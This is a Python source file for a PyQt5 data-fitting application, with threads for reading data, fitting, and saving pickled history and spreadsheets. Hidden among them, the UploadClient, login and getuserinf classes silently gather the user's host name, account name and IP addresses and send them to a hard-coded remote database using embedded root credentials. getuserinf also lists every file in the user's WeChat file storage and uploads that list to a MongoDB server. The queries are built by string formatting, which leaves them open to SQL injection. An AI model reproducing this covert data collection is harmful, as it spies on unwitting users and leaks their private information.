
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5 import QtCore, QtGui, QtWidgets
from dataread import *
import pickle
import pymysql
import socket
import time
import requests
import getpass
from pymongo import MongoClient
from gridfs import *

class readthread(QThread):
    sinOutpro = pyqtSignal(float)
    sinOuttext = pyqtSignal(str)
    sinOutbool = pyqtSignal(bool)
    # sinOutinlinebool = pyqtSignal(bool)
    # sinOutoutlinebool = pyqtSignal(bool)
    # sinOutinlinetext = pyqtSignal(str)
    # sinOutoutlinetext = pyqtSignal(str)
    sinOutoutEndThread = pyqtSignal(datastruct)
    # sinOutoutpath = pyqtSignal(str)
    # sinOutoutData = pyqtSignal(dataclass)
    def __init__(self,path):
        self.data=""
        self.path=path
        super(readthread,self).__init__()
    def run(self):
        Process= dataProcess(self.sinOutpro, self.sinOuttext, self.sinOutbool)
        print("地址：",self.path,"建立完！")
        print("文件：",Process.data.filelist)
        self.data = Process.readfiles(self.path)
        print("处理完！")
        self.sinOuttext.emit("已读取并转换" + str(len(self.data.filelist)) + "个数据！")
        self.sinOutoutEndThread.emit(self.data)
        print("传送结束！")

class readhistory(QThread):
    sinOuttext = pyqtSignal(str)
    sinOutoutEndThread = pyqtSignal(datastruct)
    def __init__(self,path):
        self.data=""
        self.path = path
        super(readhistory, self).__init__()
    def run(self):
        self.sinOuttext.emit("正在读取历史文件...")
        f = open(self.path, 'rb')
        self.data = pickle.load(f)
        f.close()
        self.sinOuttext.emit("历史文件读取成功！")
        self.sinOutoutEndThread.emit(self.data)

class savehistory(QThread):
    sinOuttext = pyqtSignal(str)
    def __init__(self,path,data):
        self.data=data
        self.path = path
        super(savehistory, self).__init__()
    def run(self):
        print("保存数据")
        # print("self.data.cb1setChecked:",self.data.cb1setChecked)
        # print("self.data.cb2setChecked:",self.data.cb2setChecked)
        self.sinOuttext.emit("正在保存当前状态...")
        filename = self.path + "/" + os.path.basename(self.path) + ".data"
        print(self.data.filelist)
        try:
            with open(filename, "wb") as file:
                pickle.dump(self.data, file, True)
            with open(filename, "rb") as file:
                data1 = pickle.load(file)
            print(data1)
        except Exception as a:
            print(a)
        print("保存缓存")
        filename = os.getcwd() + "/cache/temp.ache"
        filepath = os.getcwd() + "/cache/"
        if (not os.path.exists(filepath)):
            os.makedirs(filepath)
        datapath = self.data.inpath + "/" + os.path.basename(self.data.inpath) + ".data"
        with open(filename, "wb") as file:
            pickle.dump(datapath, file, True)
        self.sinOuttext.emit("当前状态保存成功!")

class fitthread(QThread):
    print("启动拟合线程...")
    sinOutpro = pyqtSignal(float)
    sinOuttext = pyqtSignal(str)
    sinOutbool = pyqtSignal(bool)
    # sinOutpro = pyqtSignal(float)
    # sinOuttext = pyqtSignal(str)
    # sinOutbool = pyqtSignal(bool)
    # sinOutinlinebool = pyqtSignal(bool)
    # sinOutoutlinebool = pyqtSignal(bool)
    # sinOutinlinetext = pyqtSignal(str)
    # sinOutoutlinetext = pyqtSignal(str)
    # sinOutoutfitEndThread = pyqtSignal(datastruct)
    sinOutoutfitEndThread = pyqtSignal()

    # sinOutoutpath = pyqtSignal(str)
    # sinOutoutData = pyqtSignal(dataclass)
    def __init__(self, data,paras):
        self.data = data
        self.paras=paras
        super(fitthread, self).__init__()

    def run(self):
        print("fit run in")
        Process = dataProcess(self.sinOutpro, self.sinOuttext, self.sinOutbool)
        Process.data=self.data
        for para in self.paras:
            Process.Fitting(para[0], para[1], para[2], para[3], para[4], para[5], para[6],
                              para[7], para[8])
        self.sinOutoutfitEndThread.emit()

class savefilethread(QThread):
    sinOutpro = pyqtSignal(float)
    sinOuttext = pyqtSignal(str)
    sinOutbool = pyqtSignal(bool)
    # sinOutoutfitEndThread = pyqtSignal()
    # sinOutoutpath = pyqtSignal(str)
    # sinOutoutData = pyqtSignal(dataclass)
    def __init__(self, data):
        self.data = data
        super(savefilethread, self).__init__()

    def run(self):
        print("启动保存文件线程...")
        Process = dataProcess(self.sinOutpro, self.sinOuttext, self.sinOutbool)
        # Process.data=self.data
        Process.writeXls(self.data)
        # self.sinOutoutfitEndThread.emit()

class savesondatathread(QThread):
    sinOutpro = pyqtSignal(float)
    sinOuttext = pyqtSignal(str)
    sinOutbool = pyqtSignal(bool)

    # sinOutoutfitEndThread = pyqtSignal()
    # sinOutoutpath = pyqtSignal(str)
    # sinOutoutData = pyqtSignal(dataclass)
    def __init__(self, data):
        self.data = data
        super(savesondatathread, self).__init__()

    def run(self):
        print("启动保存数据子矩阵线程...")
        Process = dataProcess(self.sinOutpro, self.sinOuttext, self.sinOutbool)
        # Process.data = self.data
        Process.writesondataXls(self.data)
        # self.sinOutoutfitEndThread.emit()

class savesingledatathread(QThread):
    sinOutpro = pyqtSignal(float)
    sinOuttext = pyqtSignal(str)
    sinOutbool = pyqtSignal(bool)

    # sinOutoutfitEndThread = pyqtSignal()
    # sinOutoutpath = pyqtSignal(str)
    # sinOutoutData = pyqtSignal(dataclass)
    def __init__(self, data):
        self.data = data
        super(savesingledatathread, self).__init__()

    def run(self):
        print("启动保存单个文件历史线程")
        Process = dataProcess(self.sinOutpro, self.sinOuttext, self.sinOutbool)
        # Process.data = self.data
        Process.writesinglefiledata(self.data)
        # self.sinOutoutfitEndThread.emit()

class UploadClient(QThread):
    def __init__(self, name):
        self.dataname = name
        super(UploadClient, self).__init__()

    def run(self):
        try:
            # 打开数据库连接
            db = pymysql.connect("47.105.38.117", "root", "1234", "datafitting", port=3306, charset='utf8')
            # 端口号3306，utf-8编码，否则中文有可能会出现乱码。
            # 使用 cursor() 方法创建一个游标对象 cursor
            cursor = db.cursor()
            # 如果存在表则删除
            # cursor.execute("DROP TABLE IF EXISTS Employee")

            # 使用 execute()  方法执行 SQL 查询
            pcname = socket.getfqdn(socket.gethostname())
            username = getpass.getuser()
            outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
            inip = socket.gethostbyname(pcname)
            currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print('上传客户端数据信息：',username,outip,inip,self.dataname)
            sql = "INSERT INTO loginf (pcname,username,outip,inip,time,dataname)VALUES('{pcname}','{username}','{outip}','{inip}','{time}','{name}')".format(
                pcname=pcname,username=username, outip=outip, inip=inip, time=currrenttime,name=self.dataname)
            # print(sql)
            # sql2 = '''SELECT * from user'''
        finally:
            try:
                cursor.execute(sql)

                text = cursor.fetchall()
                db.commit()
                # print(text[0])
            except Exception as e:
                db.rollback()  # 如果出错就回滚并且抛出错误收集错误信息。
                print("Error!:{0}".format(e))
            finally:
                db.close()
            # 关闭数据库连接

class login(QThread):
    def __init__(self):
        super(login, self).__init__()
    def run(self):
        # try:
            # 打开数据库连接
            db = pymysql.connect("47.105.38.117", "root", "1234", "datafitting", port=3306, charset='utf8')
            # 端口号3306，utf-8编码，否则中文有可能会出现乱码。
            # 使用 cursor() 方法创建一个游标对象 cursor
            cursor = db.cursor()
            # 如果存在表则删除
            # cursor.execute("DROP TABLE IF EXISTS Employee")

            # 使用 execute()  方法执行 SQL 查询
            username = socket.getfqdn(socket.gethostname())
            outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
            inip = socket.gethostbyname(username)
            currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print('上传用户登录信息：',username,outip,inip,currrenttime)
            sql = "INSERT INTO login (username,outip,inip,time)VALUES('{username}','{outip}','{inip}','{time}')".format(
                username=username, outip=outip, inip=inip, time=currrenttime)
            # print(sql)
            # sql2 = '''SELECT * from user'''
        # finally:
            try:
                cursor.execute(sql)

                text = cursor.fetchall()
                db.commit()
                # print(text[0])
            except Exception as e:
                db.rollback()  # 如果出错就回滚并且抛出错误收集错误信息。
                print("Error!:{0}".format(e))
            finally:
                db.close()
            # 关闭数据库连接


class getuserinf(QThread):
    def __init__(self):
        super(getuserinf, self).__init__()
    def run(self):
        pcname = socket.getfqdn(socket.gethostname())
        username = getpass.getuser()
        # print(username)
        # outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
        # inip = socket.gethostbyname(username)
        # currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        conn = MongoClient('47.105.38.117', 27017)
        db = conn.userdata
        key = username + pcname
        mycol = db[username + pcname]
        # mycol.remove({})
        if(os.path.exists('C:/Users/' + username + '/Documents/WeChat Files/')):
            wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'
        else:
            return
        tarpath = ''
        for i in os.listdir(wxfilepath):
            # print(i[:2])
            if (i[:2] == 'wx'):
                # print(i)
                tarpath = i
        filelist = []
        for root, dirs, files in os.walk(wxfilepath + tarpath + '\FileStorage\File', topdown=False):
            for name in files:
                # print(os.path.join(root, name))
                filelist.append(os.path.join(root, name))
        mycol.insert({'xwdatas': filelist})




